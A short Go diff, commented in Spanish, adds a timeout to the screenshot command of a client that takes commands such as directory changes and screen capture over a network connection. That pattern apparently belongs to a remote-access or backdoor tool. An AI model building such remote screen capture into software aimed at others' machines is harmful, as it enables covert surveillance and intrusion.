@@ -159,12 +159,21 @@ func Cliente(cliente net.Conn) {
 		Cd(entrada, cliente)
 
 	} else if entrada == "ss" { // logica de ss
-		// arreglar fallo: se queda trabado en ocaciones y afecta al programa
-		// crear una gorountine con un context
-		err := Ss(cliente)
-		if err != nil {
-			fmt.Println("error al hacer screenshot: ", err)
+		ch_err := make(chan error)
+		contx, cancelar := context.WithTimeout(context.Background(), time.Second*10)
+		defer cancelar()
+		go func() {
+
+			ch_err <- Ss(cliente)
+
+		}()
+		select {
+		case <-contx.Done():
+			Envio(cliente, []byte("[!] SS tardo demasiado en responder"))
+		case erro := <-ch_err:
+			Envio(cliente, []byte(fmt.Sprintf("[!] hubo un error durante el screenshot : %s", erro)))
 		}
+
 	} else if entrada == "q" {
 		fmt.Println("[!] cliente desconectado")
 		return
